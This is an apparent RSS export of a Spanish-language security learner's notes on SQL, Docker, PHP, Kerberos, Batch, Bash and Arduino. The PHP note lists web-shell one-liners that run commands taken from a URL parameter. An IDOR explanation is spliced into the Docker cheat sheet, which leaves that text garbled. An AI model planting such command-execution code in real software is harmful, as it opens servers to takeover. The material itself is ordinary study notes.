Copy<br>Sub Consultas: <br>-- Teniendo en cuenta que el select selecciona COLUMNAS, podriamos realizar una query (Subconsulta) la cual devuelva una columna

-- De esta manera estariamos trayendo 3 datos de la tabla users, pero agregando una columna con el apartado de number perteneciente a la tabla orders
SELECT name, email, password, (select number from orders) from users; 

-- Si bien para casos como el sig se utiliza el join, si la tabla orders tiene una FK asociada con la tabla users, podriamos solicitar que se unan esos datos junto a los usuarios: 
SELECT name as 'Nombre', 
email as 'Correo Electronico', 
password as 'Contraseña', 
(SELECT number from orders where users.user_id=orders.user_id) as 'Ordenes N°',
(SELECT date from orders where users.user_id=orders.user_id) as 'Fecha' from users
-- Ahora, esta query con 2 subconsultas dentro de ellas, devolveria una tabla como la sig: 
/*
+----------+------------------------+-------------------------------+---------+--------------
| Nombre   | Correo Electronico     | Contraseña                    | Ordenes N° | Fecha  
+----------+------------------------+-------------------------------+---------+--------------
| Dobliuw  | dobliuw@dobliuw.com    | U2!+BF!.hZy1ST4r1&amp;6*&amp;3Uu1&amp;3mI |      11    | 1980-06-11     |
| ZaikoARG | zaikoarg@zaikoarg.com  | Z41k0+!1&amp;dDxD_                |    NULL    | NULL           | 
| Valen    | valenmachu@gmail.com   | 1254821158644468              |    NULL    | NULL           |
| Brian    | brian@gmail.com        | Tomi2008                      |    NULL    | NULL           |
| Jose     | jose32@gmail.com       | jose32                        |       5    | 2012-12-12     |
| Roberto  | robertoperez@gmail.com | roberto1980                   |    NULL    | NULL           |
| David    | david@gmail.com        | mihijoelmejor                 |    NULL    | NULL           |
+----------+------------------------+-------------------------------+---------+--------------

Ahora, si no quisieramos los que tenga valor NULL, como aprendimos antes podriamos empezar a utilizar y mezclar conceptos
*/
SELECT name AS 'Nombre',  
email AS 'Correo Electronico',  
password AS 'Contraseña',  
(SELECT number FROM orders AS o WHERE u.user_id=o.user_id) AS Ordenes, 
(SELECT date FROM orders AS o WHERE u.user_id=o.user_id) AS Fecha 
FROM users AS u 
HAVING Fecha AND Ordenes IS NOT NULL;

-- Ejemplo: 
SELECT user_id as 'ID', 
name as 'Nombre',  
email as 'Correo Electronico',  
password as 'Contraseña',  
(SELECT number from orders as o where u.user_id=o.user_id) as Ordenes, 
(SELECT date from orders as o where u.user_id=o.user_id) as Fecha, 
( select group_concat('[!] ',u.user_id,' x ',number,' = ',u.user_id * number) from orders as o where u.user_id=o.user_id) as 'ID * Número' 
from users as u 
having Ordenes and Fecha is not null;

-- Resultado: 
/*
+----+---------+---------------------+-------------------------------+---------+------------
| ID | Nombre  | Correo              | Contraseña  | Ordenes |   Fecha    |    ID * Número  | 
+----+---------+---------------------+-------------------------------+---------+------------
|  1 | Dobliuw | dobliuw@dobliuw.com | U2!+BF!...  |      11 | 1980-06-11 | [!] 1 x 11 = 11 |
|  5 | Jose    | jose32@gmail.com    | jose32      |       5 | 2012-12-12 | [!] 5 x 5 = 25  |
+----+---------+---------------------+-------------------------------+---------+------------
*/

-- Tambien se puede usar para condiciones: 
select name as Nombre, email as Correo from users where (select number from orders where users.user_id=orders.user_id) is not null;

Copy<br>Consultas con JOIN: <br>
<br>


<br><br><br><br>-- De esta manera estamos uniendo la tabla users y orders contemplando cada una de las posiblidades de union de la misma.
SELECT * FROM users, orders
Copy<br><br>-- Lo mismo pero de manera explicita
SELECT * FROM users CROSS JOIN orders
Copy<br><img alt="Pasted image 20230406111340.png" src="https://dobliuw.com/lib/media/pasted-image-20230406111340.png"><br>
<br>


<br><br><br><br>-- De esta manera estamos uniendo la tabla users y orders contemplando cada una de las posiblidades de union de la misma.
SELECT * FROM users, orders WHERE users.user_id=orders.user_id
Copy<br><br>-- Lo mismo pero de manera explicita 
SELECT * FROM users INNER JOIN orders ON users.user_id=orders.user_id
-- Tambien se suele usar solo el JOIN para hacer referencia a INNER JOIN 
Copy<br>Ejemplo: <br>-- ON es como el WHERE pero cuando se usa INNER JOIN
SELECT * FROM tabla1 
INNER JOIN tabla2 
ON tabla1.nombre=tabla2.nombre
Copy<br><img alt="Pasted image 20230406112807.png" src="https://dobliuw.com/lib/media/pasted-image-20230406112807.png"><br>Ejemplo: <br>-- ON es como el WHERE pero cuando se usa INNER JOIN
SELECT * FROM tabla1 
INNER JOIN tabla2 
ON tabla1.nombre=tabla2.nombre and tabla1.trabajo is not null and tabla2.estudio is not null
Copy<br><img alt="Pasted image 20230406112516.png" src="https://dobliuw.com/lib/media/pasted-image-20230406112516.png"><br>
<br>


<br><br><br>SELECT * FROM tabla1 LEFT JOIN tabla2 ON tabla1.nombre=tabla2.nombre
Copy<br><img alt="Pasted image 20230406153509.png" src="https://dobliuw.com/lib/media/pasted-image-20230406153509.png"><br>
<br>


<br><br><br>SELECT * FROM tabla1 RIGHT JOIN tabla2 ON tabla1.nombre=tabla2.nombre
Copy<br><img alt="Pasted image 20230406154836.png" src="https://dobliuw.com/lib/media/pasted-image-20230406154836.png"><br>
<br>


<br><br><br>
<br>


<br><br><img alt="Pasted image 20230407170142.png" src="https://dobliuw.com/lib/media/pasted-image-20230407170142.png"><br>
<br>


<br><br><img alt="Pasted image 20230407165626.png" src="https://dobliuw.com/lib/media/pasted-image-20230407165626.png"><br><br>
<br>


<br><br>
<br>


<br><br>
<br>


<br><br><br><br><br>
<br>


<br>mysql -u usuario -p &lt; archivo.sql
Copy<br>
<br>


<br>psql -U usuario -f archivo.sql
Copy<br>
<br>


<br>sqlcmd -S servidor -U usuario -P contraseña -i archivo.sql
Copy<br>
<br>


<br>sqlplus usuario/contraseña@nombre_instancia @archivo.sql
Copy<br><br><br><br><br><br><br>]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/SQL/SQL.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 30 Dec 2023 14:50:37 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20230215165210.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20230215165210.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Docker Cheat Sheet]]></title><description><![CDATA[ 
 <br><img alt="Pasted image 20230215163522.png" src="https://dobliuw.com/lib/media/pasted-image-20230215163522.png"><br><br><br>docker --version
# Para ver la información de la instalación de docker.
docker info
# Información de la instalación de docker.
docker run {image_name}
# Crea y ejecuta un contenedor.
docker ps 
# Listar los contenedores desplegados corriendo en el sistema.
docker ps -a 
# Listar TODOS los contenedores, corriento, parados, matados, etc.
docker inspect {container_ID}
# Esto es para ver la configuración de el contenedor.
docker run --name {whatever} {image_name}
# Crar, ejecutar un contenedor a raiz de una imagen asignandole al contenedor un nombre 
docker rename {prev_name} {new_name}
# Renombrar un contenedor.
docker rm {container_ID/container_name}
# Eliminar un contenedor
docker rm -f $(docker ps -a)ación 

​￼￼￼Para explotar una vulnerabilidad IDOR, un atacante puede intentar modificar manualmente el identificador de un objeto en la URL o utilizar una herramienta automatizada para probar diferentes valores. Si el atacante encuentra un identificador que le permite acceder a un recurso que no debería estar disponible, entonces la vulnerabilidad IDOR se ha explotado con éxito. 

​￼￼￼Por ejemplo, supongamos que un usuario ￼￼'A'￼￼ tiene un pedido con el identificador numérico ￼￼123￼￼ y el usuario ￼￼'B'￼￼ tiene un pedido con el identificador numérico ￼￼124￼￼. Si el atacante intenta acceder a través de la URL ￼￼"http://example.com/orders/124"￼￼, la aplicación web podría permitir el acceso a este pedido sin validar si el usuario tiene permiso para acceder a él. De esta manera, el atacante podría acceder al pedido del usuario ￼￼'B'￼￼ sin la debida autorización. 

De manera que con el simple hecho de pr
# Eliminar de manera forzadas todos los contenedores corriendo o no del sistema.
docker exec 
# Ejecutar comando o proceso en un container.
docker run -p {us_port}:{docker_port} -d {image_name}
# Crear y ejecutar un contenedor enlazando un puerto de nuestra maquina con un puerto del contenedor (-p 80:80) a la vez que corriendolo en segundo plano (-d = detach)
docker logs {container_name/container_id}
# Ver logs de un container
docker logs --tail 10 -f {container_name/container_id}
# Ver en tiempo real (-f = follow) las ultimas 10 lineas de los logs (--tail 10)
docker run -it -v /{os_path}:/{docker_path} {image_name}
# Crear y ejecutar un contenedor de manera interactiva con una terminal (-it) montando la ruta "os_path" en la ruta "docker_path" (-v /example.txt:/exampleDir)
docker volume ls 
# Listar volumenes
docker volume create {volume_name}
# Crear volumen
docker network ls
# Crear una imagen a partir de un dockerfile
docker build -t {image_name} {path_dockerfile}
# Listar conexiones de las redes
docker network create {name}
# Crear una red
docker network create --atachable {name}
# Crear una red a la que otros contenedores se puedan conectar.
docker network inspect {name}
# Inspeccionar una red.
docker network connect {network} {container}
# Conectar un container a una red
docker image ls 
# Listar iamgenes
docker pull {image_name}
# Traer una imagen del repo de docker hub.
docker images --fillter "dangling=true" -q
# Sacar los id's de las imagenes &lt;none&gt; 
Copy<br><br> FROM ubuntu:latest 
 # Version de la imagen
 MAINTAINER Owen Bonoris aka Dobliuw "dobliuw@dobliuw.com"
 
 ENV DEBIAN_FRONTEND noninteractive
 # Para que no entre en modo interactivo
 RUN apt update &amp;&amp; apt install -y net-tools \ 
   iputils-ping \ 
   curl \ 
   git \ 
   nano \ 
   apache2 \ 
   php
 # Comandos que quiero ejecutar a la hora de crear la imagen 
 EXPOSE 80 
 # Exponer el puerto 80 del contenedor
 ENTRYPOINT service apache2 start &amp;&amp; /bin/bash 
 # Cuando se inicie que levante el demon de apache2 y el /bin/bash para evitar errores
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/docker.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Docker.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:20 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20230215163522.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20230215163522.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Clonar sub carpetas de un repo]]></title><description><![CDATA[ 
 <br><br><br>Ejemplo, tenemos un proyecto que es el de vulhub, si quisieramos clonarnos alguna carpeta del mismo <a rel="noopener nofollow" class="external-link" href="https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2018-17246" target="_blank">https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2018-17246</a>, podriamos hacer lo sig: <br># Remplazar donde dice tree/master por /trunk
svn checkout https://github.com/vulhub/vulhub/trunk/master/kibana/CVE-2018-17246
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/git.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Git.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:21 GMT</pubDate></item><item><title><![CDATA[MongoDB]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>mongo 
# iniciar el cliente de MongoDB
show databases
# Listar las base de datos existentes
use {database_name}
# Cambiar de base de datos
show collections
# Listar las colecciones de la base de datos actual en uso
db.{collection_name}.find()
# Consultas en una colección


Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/mongodb.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/MongoDB.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:21 GMT</pubDate></item><item><title><![CDATA[Vulnerabilidades]]></title><description><![CDATA[ 
 <br><br># Ejecutar un "console.log" que se va a interpretar y mostrar en la web
echo "Esto es un texto que se va a interpretar";
# Declaración de variable
$nombre = 'Dobliuw'; 
# Obtener por query un valor bajo el nombre "cmd"
$_GET['cmd'];
$_REQUEST['cmd'];
# Usar etiquetas pre formateadas para unir (.) un comando ejecutado a nivel de sistema (shell_exec) de una query que obtenemos bajo el nombre "cmd"
# Las etiquetas pre formateadas son para que el output no se vea todo en la misma linea
echo "&lt;pre&gt;" . shell_exec($_GET['cmd']) . "&lt;/pre&gt;";
# Formas alternas de obtener por query un valor a la par que ejutarlo
&lt;?=`$_GET[0]`?&gt;
# Crear un archivo con contenido dentro
file_put_contents('file.name', base64_decode('{content.base64}')
Copy<br><br>
<br>


]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/php.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/PHP.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:21 GMT</pubDate></item><item><title><![CDATA[Sqlite3]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>.help 
# Listar el panel de ayuda de sqlite3
.databases
# Listar las bases de datos
.tables 
# Listar las tablas de la base de datos actual en uso 
select * from {table_name};
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sqlite3.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/Sqlite3.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:21 GMT</pubDate></item><item><title><![CDATA[Kerberos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:service" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#service</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:service" class="tag" target="_blank" rel="noopener nofollow">#service</a>
<br><br><br> Kerberos es un protocolo de autenticación de red ampliamente utilizado en entornos de sistemas operativos Windows y otros sistemas Unix. Su principal objetivo es proporcionar una forma segurida de autenticar a los usuarios y servicios en una red, evitando la exposición de contraseñas en texto claro y protegiendo contra ataques de reenvío y robo de credenciales.<br>
Para entender más en detalle el flujo de autenticación de kerberos podemos ver el gráfico: <a data-href="KERBEROS_AUTHETICATION_FLOW" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos_authetication_flow.html" class="internal-link" target="_self" rel="noopener nofollow">KERBEROS_AUTHETICATION_FLOW</a>.<br><img alt="keberos_authentication_flow.png" src="https://dobliuw.com/lib/media/keberos_authentication_flow.png">]]></description><link>https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html</link><guid isPermaLink="false">Notes/5. Technologies/Services/Kerberos/Kerberos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:21 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/keberos_authentication_flow.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/keberos_authentication_flow.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[KERBEROS_AUTHETICATION_FLOW]]></title><description><![CDATA[ 
 
  
  
  
    
  
  10.10.11.166KDCKey DistributionCenterCredencialesUser/Passwd          DEFINICIONES:TGT (Ticket Granting Ticket): Ticket que es presentado al KDC para obtener TGS.TGS (Ticket Granting Service): Ticket que es presentado al servicio cuyos recursos nos queremos conectarKDC (Key Distribution Center):Es el  servicio de Kerberos encargado de distribuir los tickets a los usuarios, instalado en el DC.AP (Aplication Server):Servicio que ofrece los recursosa los que  nos queremos conectar.KERBEROS  AUTHENTICATION FLOWPassword --&gt; hash NTLMTimestamp AS-REQ (TGT ?)TGT (Cifrado y firmado)user: krbtgtAS-REP (TGT)TGS-REQ (TGS ?)123TGS (NTLM Hash)4TGS-REP (TGS)AuthenticationsuccessAP-REQ ---&gt; TGSAP-REP Ejemplo: MSSQL567ATACANTEAPVICTIMA]]></description><link>https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos_authetication_flow.html</link><guid isPermaLink="false">Notes/5. Technologies/Services/Kerberos/KERBEROS_AUTHETICATION_FLOW.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Dec 2023 15:03:11 GMT</pubDate></item><item><title><![CDATA[Batch Scripting]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:scripting" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#scripting</a> <a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:scripting" class="tag" target="_blank" rel="noopener nofollow">#scripting</a> <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>Batch es un lenguaje de scriting utilizado en sistemas Windows para realizar tareas de automatización y ejecutar secuencias de comandos en el entorno del símbolo de sistema de Windows (cmd.exe). Los archivos de sceuncias de comandos de Batch tienen una extensión .bat o .cmd.<br><br><br>/? # Si se agrega al final de un comando, se lista el panel de ayuda
ver # Version
assoc # Extensiones con tipo de archivo
cd # Change Directory
cls # Limpiar pantalla
copy # Copiar archivo
del # Eliminar archivos
dir # Listar contenido del directorio
date # Muestra la fecha actual y la permite configurar
echo # Muesta el input como output
exit # Mata la consola
md # Make Directory
move # Mueve archivos o directorios entre directorios
path # Muestra la variable del path
pause # Frena la ejecución y espera la interacción del usuario
prompt # Cambiar simbolo del sistema
rd # Remove Directory 
ren # Rename
rem # comentarios
start # COmienza un programa en una nueva ventana o abre un documento
time # Muestra la hora
type # Muestra el contenido de un archivo
vol # Muestra la etchoiqueta del volumen del disco  el número de serie
attrib # Muestra o cambia los atributos de un archivo 
icacls # Gestion de permisos
chkdsk # Verifica el disco
choice # Brinda la validación de SI o NO al usuario 
cmd # Invoca otra instancia de cmd
comp # Compara dos archivos basandose en el tamaño
convert # Converte un volumen FAT a NTFS
driverquery # Muestra los controladores de dispositivos (drivers)
expand # Expande uno o varios archivos comprimidos
find # Filtra por palabras en archivos
format # Formatea un disco para ser usado con Windows
help # Muestra la lista de los comandos en Windows
ipconfig # Muestra la configuración de IP de windows
label # Añade, cambia o remueve etiquetas de discos
more # Listar el contenido de un archivo en formato more
net # Gestionar y consultar aspectors de la red y el sistema
ping # Tramitar una traza ICMP
shutdown # Apaga el equipo, cierra la sesión, etc.
sort # Ordena alfabeticamente el contenido
subst # Asocia una ruta de acceso a una letra de unidad
systeminfo # Muestra la configuración del sistema y el equipo
taskkill # Termina una o más tareas 
tasklist # Lista las tareas inlcuyendo el nombre y el PID
xcopy # Copia archivos o directorios de una manera más avanzada
tree # Lista el contenido en forma de arbol de manera recursiva
fc # Lista las diferencias entre dos archivos
diskpart # Muestra y configura las propiedades de una partición de disco
title # Cambia el titulo mostrado en la consola 
set # Muestra la lista de las variables de entorno
&gt; # Redirigir output
Copy<br><br># Declarar una variable 
set variable="value"

# Declarar una variable de tipo integer
set /A variable_num=53

# Imprimir una variable 
echo %variable%

# Obtener argumentos pasados en la línea de comandos
echo %1 # Primer arg
echo %2 # Segundo arg
# .....

# GLOBAL vs LOCAL
set var1 = "test"
SETLOCAL
set var1 = "test"
ENDLOCAL
# Variable GLOBAL disponible en todo el script, LOCAL dentro del bloque de SETLOCAL - ENDLOCAL

# Si se usa choice, para leer la respuesta 
%errorlevel%

# Comentar 
Rem comentario
:: comentario
Copy<br><br>if "condition" (
	# code
) else if "condition" (
	# code
) else (
    # code
)

# Condicionadores
equ # Equal
neq # Not equal
lss # Less than
leq # less tan or equal
gtr # Greater than 
geq # Greater than or equal
Copy<br><br>for /l %%i in ("initial","iteration","final"); do (
	echo %%i
)
Copy<br><br># Declarar función
:function_name
# code
exit /b 0

# Invocar función
call :{function_name} {arg1,arg2,arg3}
exit /b %errorlevel%

# Example
@echo off
call :ScriptOwner dobliuw
exit /b %errorlevel%

:ScriptOwner
echo This is %~1 script
exit /b 0
Copy<br><br># Declarar un array
set list=1 2 3 4

# Recorrer el array
(for %%i in (%list%); do (
	echo %%i
)

# Acceder a la posición de un array
echo %list[0]%

# Setear valor en una posición del array
set a[0]=1
Copy<br><br># Script que crea 10 carpetas con el format Hacked1 en una ruta que se le pasa como argumento al ejecutar el archivo
# Ejecución    file.bat C:\Users\dobliuw\Desktop
@echo off

call :CreateTenDirsInPath %1

exit /b %errorlevel%

:CreateTenDirsInPath
set path=%~1
for /l %%i in (0,1,10); do (
	md %path%\Hacked%%i
)
dir path &gt; C:\Users\patri\Desktop\hacked.txt
exit /b 0

# Script encargado de borrar las carpetas que contengan la palabra 'hacked'
@echo off

call :DellAll %1
exit /b %errorlevel%

:DellAll
for /f %%i in ('dir /b %1 ^| findstr /i hacked') do (
	rd %%i
)
exit /b 0 
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/batch-scripting.html</link><guid isPermaLink="false">Notes/5. Technologies/Batch Scripting.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 20 Mar 2024 18:47:07 GMT</pubDate></item><item><title><![CDATA[Scripting en Bash]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:linux" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#linux</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags:  <a href="https://dobliuw.com?query=tag:linux" class="tag" target="_blank" rel="noopener nofollow">#linux</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>El script en Bash (Bourne-Again Shell) es un intérprete de comandos de Unix/Linux que permite a los usuarios interactuar con el sistema operativo mediante comandos. Además de ser una interfaz de línea de comandos, Bash también es un lenguaje de scripting que permite la automatización de tareas y la creación de programas simples.<br><br><br># Asigna un valor a la variable
variable="Valor"
# Imprimir el varlo de la variable
echo $variable
# Declara una variable de read only
declare -r variable="valor"
# Declara una variable de tipo integer
declare -i variable_numerica=1
# Declara un array de datos
declare -a variable_array=("dato1" 2 "dato3")
Copy<br><br># Condicional If Else
if [[ "condition" ]]; then
	# code
else:
    # code
fi
# Doble condicional if 
if [[ "condition" ]] &amp;&amp; [[ "condition2" ]]; then
  # code 
fi
# Condicional If Else alterno
[[ "condition" ]] &amp;&amp; "True Condition" || "False condition"
Copy<br><br># Bucle for
for i in {01..10}; do
	echo $i
done
# Bucle while
while true; do
    echo "while"
done
Copy<br><br># Declarar una funcion
function my_function(){
	# code
}

# Ejecutar una funcion
my_function

# Pasar argumentos a la funcion
my_function $arg1
Copy<br><br># Nombre del programa 
echo $0
# Primer argumento
echo $1
# Segundo argumento
echo $2
# ............

# Lectura de flags (Ejemplo -m 'argumento' y -h )
declare -i counter=0

while getopts "m:h" arg; do
	case $arg in
		m) argumento_pasado=$OPTARG; let counter+=1;;
		h) ;;
done

if [[ $counter -eq 1 ]]; then
	# Código...
else
	# Código...
fi
Copy<br><br># Declarar array 
declare -a my_array=(1 2 3 4)

# Mostrar una posición
echo ${my_array[2]}

# Mostrar la última posición
echo ${my_array[-1]}

# Obtener la longitud del array
echo ${#my_array[@]}

# Volcar todos los elementos
echo ${my_array[@]}

# Agragar un valor
my_array+=("new_value")

# Eliminar un valor
unset my_array[4]
my_array=(${my_array[@]})


Copy<br><br># Hacer uso del modulo RANDOM
echo $(($RANDOM))
Copy]]></description><link>https://dobliuw.com/notes/5.-technologies/scripting-en-bash.html</link><guid isPermaLink="false">Notes/5. Technologies/Scripting en Bash.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Dec 2023 19:30:49 GMT</pubDate></item><item><title><![CDATA[Arduino code]]></title><description><![CDATA[ 
 <br><br>Como se menciono previamente en apuntes como <a data-href="0. Arduino y Componentes electrónicos" href="https://dobliuw.com/notes/6.-hardware/arduino/0.-arduino-y-componentes-electrónicos.html" class="internal-link" target="_self" rel="noopener nofollow">0. Arduino y Componentes electrónicos</a>, para brindarle instrucciones al microcontrolador haremos uso del editor de texto de la <a data-tooltip-position="top" aria-label="https://www.arduino.cc/en/software" rel="noopener nofollow" class="external-link" href="https://www.arduino.cc/en/software" target="_blank">IDE de Arduino</a> en donde podremos tener un manejo y contacto más avanzado con la placa. Las instrucciones las escribiremos en un lenguaje de programación muy similar a una mezcla de C y C++.<br><br>Es muy importante entender la distribución de nuestro código en el IDE, ya que tras entrar nos encontraremos con dos funciones ya declaradas, por un lado void setup(); y por otro lado void loop();. <br>
<br>setup: En la función setup ingresaremos el código que se ejecutará una única vez al inicio del programa y se utiliza para realizar las configuraciones iniciales en nuestra placa. Aquí se incluyen tareas como la inicialización de pines de entrada y salida, configuración de comunicaciones seriales, inicialización de variables, entre otras.

<br>Ejemplo: 


<br>void setup(){
	// put your setup code here, to run once:
	digitalWrite(13, OUTPUT);
	// Initialize the pin 13 to handle a LED
}
Copy<br>
<br>loop: La función loop es el corazón del programa en Arduino. Después de que la función setup se ejecuta una vez al inicio, la función loop se ejecuta repetidamente en un ciclo continuo mientras la placa esté encendida. En esta función se incluye el código que queremos que se ejecute de manera continua, como la lectura de sensores, la actualización de salidas, la comunicación con otros dispositivos, entre otras tareas.

<br>Ejemplo:


<br>void loop(){
	digitalWrite(13, HIGH); // Turn ON the LED
	delay(1000); // Wait 1 second
	digitalWrite(13, LOW); // Turn OFF the LED
	delay(1000); // Wait 1 second
}
